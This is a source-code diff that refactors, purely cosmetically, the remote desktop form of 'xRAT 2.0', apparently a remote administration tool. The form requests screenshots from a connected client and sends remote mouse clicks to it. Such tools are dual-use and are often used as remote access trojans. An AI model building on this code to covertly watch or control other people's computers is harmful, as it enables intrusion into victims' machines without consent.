@@ -1,16 +1,18 @@
 ﻿using System;
+using System.Drawing;
 using System.Threading;
 using System.Windows.Forms;
 using xServer.Core;
-using xServer.Core.Helper;
+using xServer.Core.Packets.ServerPackets;
+using xServer.Properties;
 
 namespace xServer.Forms
 {
     public partial class FrmRemoteDesktop : Form
     {
         private readonly Client _connectClient;
-        private bool _keepRunning;
         private bool _enableMouseInput;
+        private bool _keepRunning;
 
         public FrmRemoteDesktop(Client c)
         {
@@ -23,17 +25,18 @@ namespace xServer.Forms
 
         private void FrmRemoteDesktop_Load(object sender, EventArgs e)
         {
-            this.Text = string.Format("xRAT 2.0 - Remote Desktop [{0}:{1}]", _connectClient.EndPoint.Address.ToString(), _connectClient.EndPoint.Port.ToString());
+            Text = string.Format("xRAT 2.0 - Remote Desktop [{0}:{1}]", _connectClient.EndPoint.Address,
+                _connectClient.EndPoint.Port);
 
-            panelTop.Left = (this.Width / 2) - (panelTop.Width / 2);
+            panelTop.Left = (Width/2) - (panelTop.Width/2);
 
-            btnHide.Left = (panelTop.Width / 2) - (btnHide.Width / 2);
+            btnHide.Left = (panelTop.Width/2) - (btnHide.Width/2);
 
-            btnShow.Location = new System.Drawing.Point(377, 0);
-            btnShow.Left = (this.Width / 2) - (btnShow.Width / 2);
+            btnShow.Location = new Point(377, 0);
+            btnShow.Left = (Width/2) - (btnShow.Width/2);
 
             if (_connectClient.Value != null)
-                new Core.Packets.ServerPackets.Monitors().Execute(_connectClient);
+                new Monitors().Execute(_connectClient);
         }
 
         private void GetDesktop()
@@ -44,7 +47,7 @@ namespace xServer.Forms
             {
                 try
                 {
-                    this.Invoke((MethodInvoker)delegate
+                    Invoke((MethodInvoker) delegate
                     {
                         btnStart.Enabled = false;
                         btnStop.Enabled = true;
@@ -55,27 +58,28 @@ namespace xServer.Forms
                     {
                         if (_connectClient.Value.LastDesktopSeen)
                         {
-                            int quality = 1;
-                            int selectedMonitorIndex = 0;
-                            this.Invoke((MethodInvoker)delegate
+                            var quality = 1;
+                            var selectedMonitorIndex = 0;
+                            Invoke((MethodInvoker) delegate
                             {
                                 quality = barQuality.Value;
                                 selectedMonitorIndex = cbMonitors.SelectedIndex;
                             });
 
-                            new Core.Packets.ServerPackets.Desktop(quality, selectedMonitorIndex).Execute(_connectClient);
+                            new Desktop(quality, selectedMonitorIndex).Execute(_connectClient);
                             _connectClient.Value.LastDesktopSeen = false;
                         }
                     }
                     Thread.Sleep(100);
                 }
                 catch
-                { }
+                {
+                }
             }
 
             try
             {
-                this.Invoke((MethodInvoker)delegate
+                Invoke((MethodInvoker) delegate
                 {
                     btnStart.Enabled = true;
                     btnStop.Enabled = false;
@@ -83,7 +87,8 @@ namespace xServer.Forms
                 });
             }
             catch
-            { }
+            {
+            }
 
             _keepRunning = false;
         }
@@ -97,8 +102,8 @@ namespace xServer.Forms
 
         private void FrmRemoteDesktop_Resize(object sender, EventArgs e)
         {
-            panelTop.Left = (this.Width / 2) - (panelTop.Width / 2);
-            btnShow.Left = (this.Width / 2) - (btnShow.Width / 2);
+            panelTop.Left = (Width/2) - (panelTop.Width/2);
+            btnShow.Left = (Width/2) - (btnShow.Width/2);
         }
 
         private void btnStart_Click(object sender, EventArgs e)
@@ -114,7 +119,7 @@ namespace xServer.Forms
 
         private void barQuality_Scroll(object sender, EventArgs e)
         {
-            int value = barQuality.Value;
+            var value = barQuality.Value;
             lblQualityShow.Text = value.ToString();
 
             if (value < 25)
@@ -131,14 +136,14 @@ namespace xServer.Forms
         {
             if (_enableMouseInput)
             {
-                this.picDesktop.Cursor = Cursors.Default;
-                btnMouse.Image = Properties.Resources.mouse_delete;
+                picDesktop.Cursor = Cursors.Default;
+                btnMouse.Image = Resources.mouse_delete;
                 _enableMouseInput = false;
             }
             else
             {
-                this.picDesktop.Cursor = Cursors.Hand;
-                btnMouse.Image = Properties.Resources.mouse_add;
+                picDesktop.Cursor = Cursors.Hand;
+                btnMouse.Image = Resources.mouse_add;
                 _enableMouseInput = true;
             }
         }
@@ -147,18 +152,18 @@ namespace xServer.Forms
         {
             if (picDesktop.Image != null && _enableMouseInput)
             {
-                int local_x = e.X;
-                int local_y = e.Y;
+                var local_x = e.X;
+                var local_y = e.Y;
 
-                int remote_x = local_x * picDesktop.Image.Width / picDesktop.Width;
-                int remote_y = local_y * picDesktop.Image.Height / picDesktop.Height;
+                var remote_x = local_x*picDesktop.Image.Width/picDesktop.Width;
+                var remote_y = local_y*picDesktop.Image.Height/picDesktop.Height;
 
-                bool left = true;
+                var left = true;
                 if (e.Button == MouseButtons.Right)
                     left = false;
 
                 if (_connectClient != null)
-                    new Core.Packets.ServerPackets.MouseClick(left, false, remote_x, remote_y).Execute(_connectClient);
+                    new MouseClick(left, false, remote_x, remote_y).Execute(_connectClient);
             }
         }
 
@@ -166,18 +171,18 @@ namespace xServer.Forms
         {
             if (picDesktop.Image != null && _enableMouseInput)
             {
-                int local_x = e.X;
-                int local_y = e.Y;
+                var local_x = e.X;
+                var local_y = e.Y;
 
-                int remote_x = local_x * picDesktop.Image.Width / picDesktop.Width;
-                int remote_y = local_y * picDesktop.Image.Height / picDesktop.Height;
+                var remote_x = local_x*picDesktop.Image.Width/picDesktop.Width;
+                var remote_y = local_y*picDesktop.Image.Height/picDesktop.Height;
 
-                bool left = true;
+                var left = true;
                 if (e.Button == MouseButtons.Right)
                     left = false;
 
                 if (_connectClient != null)
-                    new Core.Packets.ServerPackets.MouseClick(left, true, remote_x, remote_y).Execute(_connectClient);
+                    new MouseClick(left, true, remote_x, remote_y).Execute(_connectClient);
             }
         }
 
